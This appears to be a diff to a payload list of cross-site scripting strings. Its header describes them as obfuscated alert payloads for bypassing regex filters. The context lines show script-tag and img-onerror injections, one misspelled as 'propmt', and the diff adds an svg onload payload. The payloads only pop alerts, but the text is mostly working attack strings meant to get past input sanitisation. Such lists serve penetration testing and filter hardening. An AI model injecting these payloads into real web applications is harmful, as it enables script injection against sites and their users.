@@ -9,3 +9,4 @@ an XSS payload with Alert Obfuscation, for bypass RegEx filters
 "><script>propmt("mamunwhh")</script>
 "><img src=z onerror=alert(1)>
 "><img src=z onerror=prompt(1)>
+<svg/onload=alert(/stored-xss/.source)>\r\n
